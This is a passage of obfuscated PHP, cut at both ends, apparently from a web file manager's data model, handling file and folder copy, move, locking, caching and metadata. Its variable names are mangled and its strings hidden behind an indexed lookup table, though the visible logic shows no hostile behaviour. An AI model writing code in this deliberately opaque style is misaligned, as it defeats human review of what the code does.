$this->_lockEvent($ÇÑš¼‘–, array($áş¥¹âã[632], $áş¥¹âã[628], $áş¥¹âã[629]), $¯«™¬Ëé); $this->_lockCheckEnd($áş¥¹âã[627], $ÇÑš¼‘–); } public function lockMoveEnd($õÇÇ‘Ñø) { $š§÷Ü‰¸ =& $_SERVER[ùèÅ´Ãš]; if (!$this->allowLock()) { return; } $…µˆ±Ü = 0; $this->_lockKey($š§÷Ü‰¸[631] . $õÇÇ‘Ñø, $…µˆ±Ü); $this->_lockEvent($õÇÇ‘Ñø, array($š§÷Ü‰¸[625], $š§÷Ü‰¸[626]), $…µˆ±Ü); $this->_lockParent($õÇÇ‘Ñø, array($š§÷Ü‰¸[625], $š§÷Ü‰¸[627]), $…µˆ±Ü); $this->_lockEvent($õÇÇ‘Ñø, array($š§÷Ü‰¸[632], $š§÷Ü‰¸[628], $š§÷Ü‰¸[629]), $…µˆ±Ü); } private function _lockCheck($‚×ïÅ÷, $‡ÉÀÚ) { $¨Ü¹„­ú =& $_SERVER[ùèÅ´Ãš]; $Ïø¡ü­  = $this->sourceInfo($‡ÉÀÚ); $”é½²æ = $‚×ïÅ÷ . $¨Ü¹„­ú[10] . $‡ÉÀÚ; $this->_lockTimeStart[$”é½²æ] = timeFloat(); if (!is_array($Ïø¡ü­ )) { return; } $ÎÁ˜ = LNG($¨Ü¹„­ú[633]); CacheLock::setErrorMsg($¨Ü¹„­ú[176] . htmlspecialchars($Ïø¡ü­ [$¨Ü¹„­ú[32]]) . $¨Ü¹„­ú[178] . $ÎÁ˜); $this->_lockKey($”é½²æ, 1); $this->_lockKey($”é½²æ, 0); $…Ã¨àÖí = array_reverse($this->parentLevelArray($Ïø¡ü­ [$¨Ü¹„­ú[588]])); foreach ($…Ã¨àÖí as $Š¨¤÷éá) { $”é½²æ = $‚×ïÅ÷ . $¨Ü¹„­ú[634] . $Š¨¤÷éá; if (CacheLock::lockGet($¨Ü¹„­ú[635] . $”é½²æ)) { $Ïø¡ü­  = $this->sourceInfo($Š¨¤÷éá); CacheLock::setErrorMsg($¨Ü¹„­ú[176] . htmlspecialchars($Ïø¡ü­ [$¨Ü¹„­ú[32]]) . $¨Ü¹„­ú[178] . $ÎÁ˜); $this->_lockKey($”é½²æ, 1); $this->_lockKey($”é½²æ, 0); } } } private function _lockCheckEnd($³÷òÓñ¤, $«ÒÓÇË©) { $«÷¾Í¸Ù =& $_SERVER[ùèÅ´Ãš]; $Éå ÕÀ = $³÷òÓñ¤ . $«÷¾Í¸Ù[10] . $«ÒÓÇË©; CacheLock::setErrorMsg($«÷¾Í¸Ù[456]); if (!isset($this->_lockTimeStart[$Éå ÕÀ])) { return; } $İÎİ°…Ë = timeFloat() - $this->_lockTimeStart[$Éå ÕÀ]; unset($this->_lockTimeStart[$Éå ÕÀ]); if ($İÎİ°…Ë > 0.5) { unset(self::$cacheSourceInfo[$«÷¾Í¸Ù[535] . $«ÒÓÇË©]); } $˜ìı = $this->sourceInfo($«ÒÓÇË©); if (!$˜ìı) { show_json(LNG($«÷¾Í¸Ù[108]), !1); } } private function _lockParent($ÌÃã¾¨í, $•¨ø³¤¦, $‹ë¡Ù¥Ë) { if (!$this->autoLockSet) { return; } $ÆË üÍœ = $this->sourceInfo($ÌÃã¾¨í); if (!is_array($ÆË üÍœ)) { return; } $¼„àÆÂû = array_reverse($this->parentLevelArray($ÆË üÍœ[$_SERVER[ùèÅ´Ãš][588]])); foreach ($¼„àÆÂû as $Ç—€ÌØÊ) { $this->_lockEvent($Ç—€ÌØÊ, $•¨ø³¤¦, $‹ë¡Ù¥Ë); } } private function _lockEvent($õ¨ì™³¥, $ª´Õ™«ê, $Ü¾ÙÉ‹ƒ) { $¥ô¨Ü =& $_SERVER[ùèÅ´Ãš]; if (!$this->autoLockSet) { return; } foreach ($ª´Õ™«ê as $ª€åÌûµ) { $èÈ§Ôªç = $ª€åÌûµ . $¥ô¨Ü[10] . $õ¨ì™³¥; if ($Ü¾ÙÉ‹ƒ && CacheLock::lockGet($¥ô¨Ü[635] . $èÈ§Ôªç)) { continue; } $this->_lockKey($èÈ§Ôªç, $Ü¾ÙÉ‹ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ãê“‰×„, $™Ï£áç¢ = 1) { $àä¿‰‹÷ = $_SERVER[ùèÅ´Ãš][635] . md5($Ãê“‰×„); if ($™Ï£áç¢) { if (isset(self::$_lockItemArr[$àä¿‰‹÷])) { return; } self::$_lockItemArr[$àä¿‰‹÷] = 1; CacheLock::lock($àä¿‰‹÷, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$àä¿‰‹÷])) { return; } unset(self::$_lockItemArr[$àä¿‰‹÷]); CacheLock::unlock($àä¿‰‹÷); } } public function isParentOf($µÙãµÉ„, $â©ñö´•) { $‰Èğ´µ =& $_SERVER[ùèÅ´Ãš]; $Á’¯ÀÉº = $this->sourceInfo($µÙãµÉ„); $Äã˜õ„â = $this->sourceInfo($â©ñö´•); $‡½×³Â = $Á’¯ÀÉº[$‰Èğ´µ[588]] . $Á’¯ÀÉº[$‰Èğ´µ[194]] . $‰Èğ´µ[50]; $íåÈşÚº = $Äã˜õ„â[$‰Èğ´µ[588]] . $Äã˜õ„â[$‰Èğ´µ[194]] . $‰Èğ´µ[50]; $£Ê€Ÿ¶ß = strpos($íåÈşÚº, $‡½×³Â) === 0; return $£Ê€Ÿ¶ß; } private $targetIsDelete = 0; public function copy($œ§î‹ Õ, $ºˆÌáí©, $„ëŸï«Ä = REPEAT_REPLACE, $ÎÂÄõß™ = '') { $ĞÒ‡Š© =& $_SERVER[ùèÅ´Ãš]; $º¾ƒÏ¿ = $this->sourceInfo($œ§î‹ Õ); $¾çá›üÓ = $this->sourceInfo($ºˆÌáí©); if (!$º¾ƒÏ¿ || !$¾çá›üÓ || $¾çá›üÓ[$ĞÒ‡Š©[487]] != $ĞÒ‡Š©[91]) { return !1; } if ($this->isParentOf($œ§î‹ Õ, $ºˆÌáí©)) { return !1; } $şÕáÒ–‚ = $ÎÂÄõß™ ? $ÎÂÄõß™ : $º¾ƒÏ¿[$ĞÒ‡Š©[32]]; $this->lockCopyStart($œ§î‹ Õ); $this->lockWriteStart($ºˆÌáí©, $şÕáÒ–‚); $û›˜‚õ = array($ĞÒ‡Š©[636] => array(), $ĞÒ‡Š©[637] => array(), $ĞÒ‡Š©[638] => array()); $this->targetIsDelete = intval($º¾ƒÏ¿[$ĞÒ‡Š©[507]]); $Óˆ†¬—ë = $this->fileNameExistAuto($ºˆÌáí©, $º¾ƒÏ¿); $âŞ¹­•Ï = $this->_copy($œ§î‹ Õ, $ºˆÌáí©, $„ëŸï«Ä, $û›˜‚õ, !0, $ÎÂÄõß™); $this->_childrenListClear(); $this->lockCopyEnd($œ§î‹ Õ); $this->lockWriteEnd($ºˆÌáí©, $şÕáÒ–‚); if ($º¾ƒÏ¿[$ĞÒ‡Š©[487]] == $ĞÒ‡Š©[91] && $Óˆ†¬—ë == $âŞ¹­•Ï) { $this->folderSizeResetChildren($Óˆ†¬—ë); } Model($ĞÒ‡Š©[639])->addAll($û›˜‚õ[$ĞÒ‡Š©[637]], array(), !0); if ($Óˆ†¬—ë != $âŞ¹­•Ï || $º¾ƒÏ¿[$ĞÒ‡Š©[487]] == $ĞÒ‡Š©[91]) { Model($ĞÒ‡Š©[640])->eventCopy($âŞ¹­•Ï); } $this->saveAll($û›˜‚õ[$ĞÒ‡Š©[638]]); Model($ĞÒ‡Š©[233])->linkAdd($û›˜‚õ[$ĞÒ‡Š©[636]]); $this->folderSizeReset($ºˆÌáí©); $this->updateModifyTime($ºˆÌáí©); return $âŞ¹­•Ï; } private function _copy($›Ğ×„šå, $œ±ïç•, $€…‡ñï, &$õşà‚«Ç, $›À˜î” , $¢Ş‰šÛÛ = '') { $ ÏŒÌÜï =& $_SERVER[ùèÅ´Ãš]; $Ï÷íò‹• = $this->sourceInfoCache($›Ğ×„šå); $ó¥Ûğ‘ò = $Ï÷íò‹•[$ ÏŒÌÜï[487]] == $ ÏŒÌÜï[91]; $»úŞÖ½÷ = $¢Ş‰šÛÛ ? $¢Ş‰šÛÛ : $Ï÷íò‹•[$ ÏŒÌÜï[32]]; $š»Òç•É = $this->fileNameExistAuto($œ±ïç•, $Ï÷íò‹•); if ($›À˜î” ) { $this->_childrenAllMake($›Ğ×„šå); if ($ó¥Ûğ‘ò && $š»Òç•É) { $this->_childrenAllMake($š»Òç•É); } } if (!$š»Òç•É) { return $this->_copyCreate($›Ğ×„šå, $œ±ïç•, $»úŞÖ½÷, $õşà‚«Ç); } $ó†ÔâÚÄ = $š»Òç•É; if ($ó¥Ûğ‘ò) { if ($€…‡ñï == REPEAT_RENAME_FOLDER) { $»úŞÖ½÷ = $this->fileNameAutoCache($œ±ïç•, $»úŞÖ½÷, $€…‡ñï, $ó¥Ûğ‘ò); $ó†ÔâÚÄ = $this->_copyCreate($›Ğ×„šå, $œ±ïç•, $»úŞÖ½÷, $õşà‚«Ç); } else { $¬ì™¯È˜ = $this->_childrenList($›Ğ×„šå); foreach ($¬ì™¯È˜ as $ŠÇÜ×Ù™) { $this->_copy($ŠÇÜ×Ù™[$ ÏŒÌÜï[194]], $š»Òç•É, $€…‡ñï, $õşà‚«Ç, !1); } } } else { if ($€…‡ñï == REPEAT_RENAME || $€…‡ñï == REPEAT_RENAME_FOLDER) { $»úŞÖ½÷ = $this->fileNameAutoCache($œ±ïç•, $»úŞÖ½÷, $€…‡ñï, $ó¥Ûğ‘ò); $ó†ÔâÚÄ = $this->_copyCreate($›Ğ×„šå, $œ±ïç•, $»úŞÖ½÷, $õşà‚«Ç); } else { if ($€…‡ñï == REPEAT_REPLACE) { $»‹Ã±Ô¢ = $this->sourceInfoCache($š»Òç•É); $ ıÓşİ = $this->fileHistory($»‹Ã±Ô¢, $Ï÷íò‹•[$ ÏŒÌÜï[545]], $Ï÷íò‹•[$ ÏŒÌÜï[79]]); if ($ ıÓşİ) { $õşà‚«Ç[$ ÏŒÌÜï[636]][] = $Ï÷íò‹•[$ ÏŒÌÜï[545]]; } } else { if ($€…‡ñï == REPEAT_SKIP) { } } } Hook::trigger($ ÏŒÌÜï[641], array($ ÏŒÌÜï[642], $Ï÷íò‹•, 0)); } return $ó†ÔâÚÄ; } private function _copyCreate($óËØåôç, $İí‡öß, $¸çŸ¹‡, &$ñÃ·¿ÉÛ) { $™òÛ’µŠ =& $_SERVER[ùèÅ´Ãš]; $óšÕ•Ô× = $this->sourceInfoCache($óËØåôç); $ĞñÌ·›Ç = $this->sourceInfoCache($İí‡öß); $¬À×¢Œ = $this->_makeItemData($óšÕ•Ô×, $ĞñÌ·›Ç, $¸çŸ¹‡); Hook::trigger($™òÛ’µŠ[643], $¬À×¢Œ); Hook::trigger($™òÛ’µŠ[644], array($™òÛ’µŠ[645], $¬À×¢Œ, 0)); $›œî¢Š = $this->add($¬À×¢Œ); $ÄåÑ¾¬ = array($™òÛ’µŠ[194] => $›œî¢Š, $™òÛ’µŠ[32] => $¸çŸ¹‡); $this->_copyApplyMeta($ÄåÑ¾¬, $ñÃ·¿ÉÛ); if ($óšÕ•Ô×[$™òÛ’µŠ[487]] != $™òÛ’µŠ[91]) { $ñÃ·¿ÉÛ[$™òÛ’µŠ[636]][] = $óšÕ•Ô×[$™òÛ’µŠ[545]]; return $›œî¢Š; } $Èç·¢Ó = array(); $„Ù´í­Œ = array(); $this->_childrenListAll($óËØåôç, $Èç·¢Ó); $’ñœÌ˜ = count($Èç·¢Ó); if ($’ñœÌ˜ == 0) { return $›œî¢Š; } $àãøÒ²† = $this->sourceInfo($›œî¢Š); foreach ($Èç·¢Ó as $®†‹Á¹) { $Ä®ÔøÉì = $this->_makeItemData($®†‹Á¹, $àãøÒ²†, $®†‹Á¹[$™òÛ’µŠ[32]]); $Ä®ÔøÉì[$™òÛ’µŠ[588]] = $®†‹Á¹[$™òÛ’µŠ[588]]; $„Ù´í­Œ[] = $Ä®ÔøÉì; } $this->chunkEventSet($™òÛ’µŠ[646], array($™òÛ’µŠ[647], $¬À×¢Œ, $’ñœÌ˜)); $this->addAll($„Ù´í­Œ, array(), !1); $òäì’£Ç = $this->where(array($™òÛ’µŠ[193] => $›œî¢Š))->select(); $±Ğ¾“ä = $this->_childrenMakeRelation($Èç·¢Ó, $òäì’£Ç); $±Ğ¾“ä[$óËØåôç] = $›œî¢Š; $§›ÙŸ÷Ò = array(); $­’ê£ç = array(); foreach ($òäì’£Ç as $®†‹Á¹) { $®áïùßõ = $®†‹Á¹[$™òÛ’µŠ[194]]; $Ö°ÑâŞ¶ = $this->_childrenMatch($±Ğ¾“ä, $®†‹Á¹, $àãøÒ²†); $§›ÙŸ÷Ò[] = array($™òÛ’µŠ[194], $®áïùßõ, $™òÛ’µŠ[193], $Ö°ÑâŞ¶[$™òÛ’µŠ[193]]); $­’ê£ç[] = array($™òÛ’µŠ[194], $®áïùßõ, $™òÛ’µŠ[588], $Ö°ÑâŞ¶[$™òÛ’µŠ[588]]); $this->_copyApplyMeta($®†‹Á¹, $ñÃ·¿ÉÛ); if ($®†‹Á¹[$™òÛ’µŠ[487]] != $™òÛ’µŠ[91]) { $ñÃ·¿ÉÛ[$™òÛ’µŠ[636]][] = $®†‹Á¹[$™òÛ’µŠ[545]]; } } $this->chunkEventSet($™òÛ’µŠ[648], array($™òÛ’µŠ[649], $¬À×¢Œ, $’ñœÌ˜)); $this->saveAll($§›ÙŸ÷Ò); $this->chunkEventSet($™òÛ’µŠ[650], array($™òÛ’µŠ[651], $¬À×¢Œ, $’ñœÌ˜)); $this->saveAll($­’ê£ç); return $›œî¢Š; } private function _childrenMakeRelation($î¯âÚÁï, $´‘ªİ—î) { $˜“Ãáã¥ =& $_SERVER[ùèÅ´Ãš]; $Úâ¿¦×ï = array(); $®·è¼ß = array(); foreach ($î¯âÚÁï as $¡í¬êœ) { $Æ€¾èÃ‹ = $¡í¬êœ[$˜“Ãáã¥[32]] . $˜“Ãáã¥[8] . $¡í¬êœ[$˜“Ãáã¥[588]]; $Úâ¿¦×ï[$Æ€¾èÃ‹] = $¡í¬êœ[$˜“Ãáã¥[194]]; } foreach ($´‘ªİ—î as $¡í¬êœ) { $Æ€¾èÃ‹ = $¡í¬êœ[$˜“Ãáã¥[32]] . $˜“Ãáã¥[8] . $¡í¬êœ[$˜“Ãáã¥[588]]; $‰÷êû«Ø = $Úâ¿¦×ï[$Æ€¾èÃ‹]; $®·è¼ß[$‰÷êû«Ø] = $¡í¬êœ[$˜“Ãáã¥[194]]; } return $®·è¼ß; } private function _childrenMatch($š•Û¨é¾, $ÎÉÏÚîÒ, $¸Ÿ‹íŠÛ) { $á½âùİÊ =& $_SERVER[ùèÅ´Ãš]; $†Š‹ş«– = $¸Ÿ‹íŠÛ[$á½âùİÊ[588]]; $¥äÜÔÔÊ = $this->parentLevelArray($ÎÉÏÚîÒ[$á½âùİÊ[588]]); foreach ($¥äÜÔÔÊ as $ı«ÜƒÓÍ) { if (isset($š•Û¨é¾[$ı«ÜƒÓÍ])) { $†Š‹ş«– .= $š•Û¨é¾[$ı«ÜƒÓÍ] . $á½âùİÊ[652]; } } $†Š‹ş«– = rtrim($†Š‹ş«–, $á½âùİÊ[50]) . $á½âùİÊ[50]; $¯¥®»  = $this->parentLevelArray($†Š‹ş«–); $§©ØËÑÏ = $¯¥®» [count($¯¥®» ) - 1]; return array($á½âùİÊ[193] => $§©ØËÑÏ, $á½âùİÊ[588] => $†Š‹ş«–); } private function _makeItemData($ÌšÜËÚ, $êëõöğ•, $Ø¨ÕÆ«Ÿ) { $­úãš»É =& $_SERVER[ùèÅ´Ãš]; $£î°¸ = array($­úãš»É[653] => $ÌšÜËÚ[$­úãš»É[487]], $­úãš»É[496] => $Ø¨ÕÆ«Ÿ, $­úãš»É[654] => $ÌšÜËÚ[$­úãš»É[488]] ? $ÌšÜËÚ[$­úãš»É[488]] : $­úãš»É[12], $­úãš»É[546] => $ÌšÜËÚ[$­úãš»É[545]] ? $ÌšÜËÚ[$­úãš»É[545]] : 0, $­úãš»É[624] => $ÌšÜËÚ[$­úãš»É[79]] ? $ÌšÜËÚ[$­úãš»É[79]] : 0, $­úãš»É[655] => intval($êëõöğ•[$­úãš»É[191]]), $­úãš»É[656] => intval($êëõöğ•[$­úãš»É[573]]), $­úãš»É[657] => intval(USER_ID), $­úãš»É[658] => intval(USER_ID), $­úãš»É[479] => intval($êëõöğ•[$­úãš»É[194]]), $­úãš»É[659] => $êëõöğ•[$­úãš»É[588]] . $êëõöğ•[$­úãš»É[194]] . $­úãš»É[50], $­úãš»É[500] => $ÌšÜËÚ[$­úãš»É[88]] ? $ÌšÜËÚ[$­úãš»É[88]] : time(), $­úãš»É[506] => 0, $­úãš»É[660] => $­úãš»É[12]); return $£î°¸; } private function _copyApplyMeta($Ú—ŞÇ÷, &$Æƒš¬ËÀ) { $àèƒ”é’ =& $_SERVER[ùèÅ´Ãš]; $†ÁÆ£„ø = $Ú—ŞÇ÷[$àèƒ”é’[194]]; $ãĞ“Ó«Û = $Ú—ŞÇ÷[$àèƒ”é’[32]]; if (!isset($Ú—ŞÇ÷[$àèƒ”é’[661]]) || !$Ú—ŞÇ÷[$àèƒ”é’[661]] || $Ú—ŞÇ÷[$àèƒ”é’[661]] == $àèƒ”é’[231]) { $Æƒš¬ËÀ[$àèƒ”é’[638]][] = array($àèƒ”é’[194], $†ÁÆ£„ø, $àèƒ”é’[661], short_id($†ÁÆ£„ø)); } if (Input::check($ãĞ“Ó«Û, $àèƒ”é’[662])) { $Æƒš¬ËÀ[$àèƒ”é’[637]][] = array($àèƒ”é’[194] => $†ÁÆ£„ø, $àèƒ”é’[97] => $àèƒ”é’[540], $àèƒ”é’[452] => str_replace($àèƒ”é’[53], $àèƒ”é’[12], Pinyin::get($ãĞ“Ó«Û))); $Æƒš¬ËÀ[$àèƒ”é’[637]][] = array($àèƒ”é’[194] => $†ÁÆ£„ø, $àèƒ”é’[97] => $àèƒ”é’[539], $àèƒ”é’[452] => Pinyin::get($ãĞ“Ó«Û, $àèƒ”é’[663])); } $Æƒš¬ËÀ[$àèƒ”é’[637]][] = array($àèƒ”é’[194] => $†ÁÆ£„ø, $àèƒ”é’[97] => $àèƒ”é’[519], $àèƒ”é’[452] => KodSort::makeStr($ãĞ“Ó«Û)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($×§ ƒ²¾) { $é°Ûšç =& $_SERVER[ùèÅ´Ãš]; $ş°î€ĞŞ = $this->sourceInfo($×§ ƒ²¾); $œşØôè— = $é°Ûšç[664]; $®ê——»å = array($é°Ûšç[588] => array($é°Ûšç[619], $ş°î€ĞŞ[$é°Ûšç[588]] . $×§ ƒ²¾ . $é°Ûšç[620]), $é°Ûšç[507] => $this->targetIsDelete); $İ¾‚¯‘ = $this->field($œşØôè—)->where($®ê——»å)->select(); if (!$İ¾‚¯‘) { return; } $İ¾‚¯‘ = array_to_keyvalue($İ¾‚¯‘, $é°Ûšç[194]); foreach ($İ¾‚¯‘ as $À²èÇê‚) { $Ï©—Ë²š = $À²èÇê‚[$é°Ûšç[193]]; $×§ ƒ²¾ = $À²èÇê‚[$é°Ûšç[194]]; if (!isset($this->_childrenListCache[$×§ ƒ²¾]) && $À²èÇê‚[$é°Ûšç[487]] == $é°Ûšç[91]) { $this->_childrenListCache[$×§ ƒ²¾] = array(); } if (!isset($this->_childrenListCache[$Ï©—Ë²š])) { $this->_childrenListCache[$Ï©—Ë²š] = array(); } $this->_childrenListCache[$Ï©—Ë²š][$×§ ƒ²¾] = $À²èÇê‚; $this->_childrenItemCache[$×§ ƒ²¾] = $À²èÇê‚; } } private function _childrenListAll($—Á’ğö, &$è±ú´”­) { $çä„Ş‰³ =& $_SERVER[ùèÅ´Ãš]; if (!isset($this->_childrenListCache[$—Á’ğö])) { return; } $¢î°ÜÚ = $this->_childrenListCache[$—Á’ğö]; foreach ($¢î°ÜÚ as $Êí°Ì³ => $¿ºşë£ª) { $è±ú´”­[$Êí°Ì³] = $¿ºşë£ª; if ($¿ºşë£ª[$çä„Ş‰³[487]] == $çä„Ş‰³[91]) { $this->_childrenListAll($Êí°Ì³, $è±ú´”­); } } } private function sourceInfoCache($…™÷£Ş¢) { if (isset($this->_childrenItemCache[$…™÷£Ş¢])) { return $this->_childrenItemCache[$…™÷£Ş¢]; } return $this->sourceInfo($…™÷£Ş¢); } private function _childrenList($İŠé¡—Ë) { if (isset($this->_childrenListCache[$İŠé¡—Ë])) { return $this->_childrenListCache[$İŠé¡—Ë]; } return $this->_childrenListSelect($İŠé¡—Ë); } private function _childrenListSelect($øÜŞáÈù) { $æ¾´ÊË =& $_SERVER[ùèÅ´Ãš]; $î¢ëí©Í = array($æ¾´ÊË[193] => $øÜŞáÈù, $æ¾´ÊË[507] => $this->targetIsDelete); $œÇ¼©Õ = $this->where($î¢ëí©Í)->select(); $œÇ¼©Õ = $œÇ¼©Õ ? $œÇ¼©Õ : array(); $êùØ˜Š’ = array_to_keyvalue($œÇ¼©Õ, $æ¾´ÊË[194]); $this->_childrenListCache[$øÜŞáÈù] = $êùØ˜Š’; foreach ($êùØ˜Š’ as $øÜŞáÈù => $ÜÁ¾‡) { $this->_childrenItemCache[$øÜŞáÈù] = $ÜÁ¾‡; } return $êùØ˜Š’; } private function fileNameExistAuto($‹Š»ğñÚ, $·òãÙÌÓ) { $ˆÂé‹­İ =& $_SERVER[ùèÅ´Ãš]; if ($·òãÙÌÓ[$ˆÂé‹­İ[507]] == $ˆÂé‹­İ[91]) { return $this->fileNameExist($‹Š»ğñÚ, $·òãÙÌÓ[$ˆÂé‹­İ[32]]); } return $this->fileNameExistCache($‹Š»ğñÚ, $·òãÙÌÓ[$ˆÂé‹­İ[32]]); } private function fileNameExistCache($Ğ­æ¨‹Ë, $¯ü®›ä) { $™ùñÓ³¦ =& $_SERVER[ùèÅ´Ãš]; $¯ü®›ä = strtolower($¯ü®›ä); $ñó÷ë× = $this->_childrenList($Ğ­æ¨‹Ë); foreach ($ñó÷ë× as $‚ÃÍù¥) { if ($¯ü®›ä == strtolower($‚ÃÍù¥[$™ùñÓ³¦[32]])) { return $‚ÃÍù¥[$™ùñÓ³¦[194]]; } } return !1; } private function fileNameAutoCache($ÉÑîî‹ç, $Ää­ñ¼á, $‘úıü, $’½ÏÀÃ ) { $Àé¦‡¨ =& $_SERVER[ùèÅ´Ãš]; $‰©¶ïˆ¡ = $this->_childrenList($ÉÑîî‹ç); $õ–â£š¯ = array_to_keyvalue($‰©¶ïˆ¡, $Àé¦‡¨[12], $Àé¦‡¨[32]); return $this->fileNameAutoGet($õ–â£š¯, $Ää­ñ¼á, $‘úıü, $’½ÏÀÃ ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ç÷÷·ß, $¦ ½ÉšË, $ÙşÎ—ªÒ = REPEAT_REPLACE, $«ûú‚ä = '') { $Ë©²¢ÌÓ =& $_SERVER[ùèÅ´Ãš]; $çí­çş× = $this->sourceInfo($ç÷÷·ß); $…‚ÒóØÅ = $this->sourceInfo($¦ ½ÉšË); if ($çí­çş×[$Ë©²¢ÌÓ[193]] == $…‚ÒóØÅ[$Ë©²¢ÌÓ[194]]) { if ($çí­çş×[$Ë©²¢ÌÓ[507]] == $Ë©²¢ÌÓ[91]) { Model($Ë©²¢ÌÓ[505])->restore(array($ç÷÷·ß)); } if (!$«ûú‚ä || $«ûú‚ä == $çí­çş×[$Ë©²¢ÌÓ[32]]) { return $ç÷÷·ß; } } $†ğƒú¦ = $this->pathInfoMore($ç÷÷·ß); if ($this->isParentOf($ç÷÷·ß, $¦ ½ÉšË)) { return !1; } if (!$çí­çş× || !$…‚ÒóØÅ || $…‚ÒóØÅ[$Ë©²¢ÌÓ[487]] != $Ë©²¢ÌÓ[91]) { return !1; } Hook::trigger($Ë©²¢ÌÓ[665], $†ğƒú¦); $this->targetIsDelete = intval($çí­çş×[$Ë©²¢ÌÓ[507]]); if ($çí­çş×[$Ë©²¢ÌÓ[193]] == $¦ ½ÉšË && $«ûú‚ä != $çí­çş×[$Ë©²¢ÌÓ[32]]) { $†¢ùÅúÓ = $this->fileNameExist($¦ ½ÉšË, $«ûú‚ä); if ($†¢ùÅúÓ && $çí­çş×[$Ë©²¢ÌÓ[487]] == $Ë©²¢ÌÓ[231]) { $ùÜŸ¯­Ñ = $this->sourceInfo($†¢ùÅúÓ); $î¸¦“Ô¶ = $this->fileHistory($ùÜŸ¯­Ñ, $çí­çş×[$Ë©²¢ÌÓ[545]], $çí­çş×[$Ë©²¢ÌÓ[79]]); if (!$î¸¦“Ô¶) { Model($Ë©²¢ÌÓ[548])->remove($çí­çş×[$Ë©²¢ÌÓ[545]]); } $this->removeNow($ç÷÷·ß, !1); $this->folderSizeReset($¦ ½ÉšË); Hook::trigger($Ë©²¢ÌÓ[666], $†ğƒú¦); return $†¢ùÅúÓ; } } $û¹ÛÄ©© = $«ûú‚ä ? $«ûú‚ä : $çí­çş×[$Ë©²¢ÌÓ[32]]; $this->lockMoveStart($ç÷÷·ß); $this->lockWriteStart($¦ ½ÉšË, $û¹ÛÄ©©); $ÏÜİ¬Ø = array($Ë©²¢ÌÓ[636] => array(), $Ë©²¢ÌÓ[667] => !1); $this->clearShare($ç÷÷·ß, $¦ ½ÉšË); $üûıİ¸ = $this->fileNameExistAuto($¦ ½ÉšË, $çí­çş×); $ñ“Ğ–“ = $this->_move($ç÷÷·ß, $¦ ½ÉšË, $ÙşÎ—ªÒ, $ÏÜİ¬Ø, $«ûú‚ä); $this->sourceCacheClear(); if ($çí­çş×[$Ë©²¢ÌÓ[487]] == $Ë©²¢ÌÓ[91] && $üûıİ¸) { $this->folderSizeResetChildren($ñ“Ğ–“); } Model($Ë©²¢ÌÓ[233])->linkAdd($ÏÜİ¬Ø[$Ë©²¢ÌÓ[636]]); if ($ñ“Ğ–“ && $üûıİ¸ && $ÏÜİ¬Ø[$Ë©²¢ÌÓ[667]]) { $¶»ˆô– = $çí­çş×[$Ë©²¢ÌÓ[487]] == $Ë©²¢ÌÓ[91] ? $this->_childrenListSelect($ç÷÷·ß) : !1; $º÷ş”®å = $¶»ˆô– && count($¶»ˆô–) > 0 ? !0 : !1; $this->removeNow($ç÷÷·ß, $º÷ş”®å); } $this->lockMoveEnd($ç÷÷·ß); $this->lockWriteEnd($¦ ½ÉšË, $û¹ÛÄ©©); $this->folderSizeReset($çí­çş×[$Ë©²¢ÌÓ[193]]); $this->folderSizeReset($¦ ½ÉšË); $§å¤¯Ÿ = array($çí­çş×[$Ë©²¢ÌÓ[193]], $¦ ½ÉšË); if ($çí­çş×[$Ë©²¢ÌÓ[487]] == $Ë©²¢ÌÓ[91]) { $§å¤¯Ÿ[] = $ç÷÷·ß; } $this->updateModifyTime($§å¤¯Ÿ); Model($Ë©²¢ÌÓ[640])->eventMove($ç÷÷·ß, $çí­çş×[$Ë©²¢ÌÓ[193]], $¦ ½ÉšË); Hook::trigger($Ë©²¢ÌÓ[666], $†ğƒú¦); return $ñ“Ğ–“; } private function _move($ÜÁïœÉ, $ÆØ×ïšÒ, $· ™ıÓ², &$Ã§»ğ®¸, $Á¤‚üó = '') { $æÜıçÊ† =& $_SERVER[ùèÅ´Ãš]; $áä÷•¼­ = $this->sourceInfo($ÜÁïœÉ); $±‚ãÕî = $áä÷•¼­[$æÜıçÊ†[487]] == $æÜıçÊ†[91]; $“¬í¿¹ = $Á¤‚üó ? $Á¤‚üó : $áä÷•¼­[$æÜıçÊ†[32]]; $ÎÂÄ¤Œƒ = $this->fileNameExistAuto($ÆØ×ïšÒ, $áä÷•¼­); $this->lockMoveStart($ÜÁïœÉ); $this->lockWriteStart($ÆØ×ïšÒ, $“¬í¿¹); if (!$ÎÂÄ¤Œƒ) { return $this->_moveForce($ÜÁïœÉ, $ÆØ×ïšÒ, $“¬í¿¹); } $öÎ¹Øˆû = $ÎÂÄ¤Œƒ; $ÍÌı›¶’ = !1; if ($±‚ãÕî) { if ($· ™ıÓ² == REPEAT_RENAME_FOLDER) { $“¬í¿¹ = $this->fileNameAuto($ÆØ×ïšÒ, $“¬í¿¹, $· ™ıÓ², $±‚ãÕî); $öÎ¹Øˆû = $this->_moveForce($ÜÁïœÉ, $ÆØ×ïšÒ, $“¬í¿¹); } else { $ëÆË¤×Å = $this->_childrenListSelect($ÜÁïœÉ); foreach ($ëÆË¤×Å as $™…¯¤) { $†‡Æ÷€Ç = REPEAT_REPLACE; $this->_move($™…¯¤[$æÜıçÊ†[194]], $ÎÂÄ¤Œƒ, $†‡Æ÷€Ç, $Ã§»ğ®¸); } $ÍÌı›¶’ = !0; } } else { if ($· ™ıÓ² == REPEAT_RENAME || $· ™ıÓ² == REPEAT_RENAME_FOLDER) { $“¬í¿¹ = $this->fileNameAuto($ÆØ×ïšÒ, $“¬í¿¹, $· ™ıÓ², $±‚ãÕî); $öÎ¹Øˆû = $this->_moveForce($ÜÁïœÉ, $ÆØ×ïšÒ, $“¬í¿¹); } else { $İÛ……²Ø = $this->sourceInfoCache($ÎÂÄ¤Œƒ); $Üç€ÙŒ = $this->fileHistory($İÛ……²Ø, $áä÷•¼­[$æÜıçÊ†[545]], $áä÷•¼­[$æÜıçÊ†[79]]); if ($Üç€ÙŒ) { $Ã§»ğ®¸[$æÜıçÊ†[636]][] = $áä÷•¼­[$æÜıçÊ†[545]]; } $ÍÌı›¶’ = !0; } } if ($ÍÌı›¶’) { $Ã§»ğ®¸[$æÜıçÊ†[667]] = !0; } return $öÎ¹Øˆû; } private function _moveForce($à®º÷‚Ë, $×°¢¸É¦, 